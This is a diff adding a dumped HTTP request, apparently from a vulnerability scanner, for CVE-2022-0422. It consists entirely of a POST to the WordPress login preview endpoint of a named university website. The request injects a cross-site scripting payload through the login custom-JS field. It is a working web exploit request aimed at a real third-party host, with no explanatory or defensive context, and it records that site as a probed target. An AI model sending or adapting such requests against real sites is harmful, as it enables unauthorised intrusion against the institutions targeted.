@@ -1,0 +1,12 @@
+[CVE-2022-0422] Dumped HTTP request for https://ess.science.unimelb.edu.au/wp-login.php?wlcms-action=preview
+
+
+POST /wp-login.php?wlcms-action=preview HTTP/1.1
+Host: ess.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 51
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+wlcms%5B_login_custom_js%5D=alert%28%2FXSS%2F%29%3B
